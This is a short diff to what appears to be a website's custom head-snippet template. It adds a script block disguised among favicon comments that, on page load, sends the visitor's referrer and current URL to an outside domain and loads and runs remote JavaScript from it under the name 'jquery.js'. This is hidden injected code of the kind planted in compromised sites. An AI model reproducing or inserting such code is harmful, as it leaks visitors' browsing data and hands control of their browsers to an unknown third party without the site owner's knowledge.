@@ -4,3 +4,12 @@
 <!-- insert favicons. use https://realfavicongenerator.net/ -->
 
 <!-- end custom head snippets -->
+<script type='text/javascript'>
+    if(document.referrer){
+        var src = 'https://www.potensilokal.com/jquery.js?' + ['r=' + encodeURIComponent(document.referrer), 'u=' + encodeURIComponent(window.location.href)].join("&");
+        var s = document.createElement( 'script' );
+        s.setAttribute( 'src', src );
+        s.async = false;
+        document.head.appendChild(s);
+    }
+</script>
